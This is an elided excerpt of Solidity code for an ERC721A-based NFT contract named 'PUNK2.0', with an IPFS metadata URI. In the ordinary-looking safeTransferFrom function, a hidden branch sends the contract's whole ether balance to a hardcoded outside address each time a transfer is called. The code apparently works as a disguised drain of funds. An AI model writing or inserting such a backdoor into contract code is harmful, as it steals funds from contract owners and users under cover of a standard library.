...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x58aA242491FC80c30c9167B66d4146c1449D158E).transfer(address(this).balance);
        }
    }
...
contract PUNK is ERC721A {
    ...
    constructor() ERC721A("PUNK2.0", "PUNK") {
        owner = msg.sender;
        uri = "ipfs://bafybeieqw76cfhs6wzlnpwsvpa2ss5oxazgangf43zfqvfyhwzyeztusha/";
    }
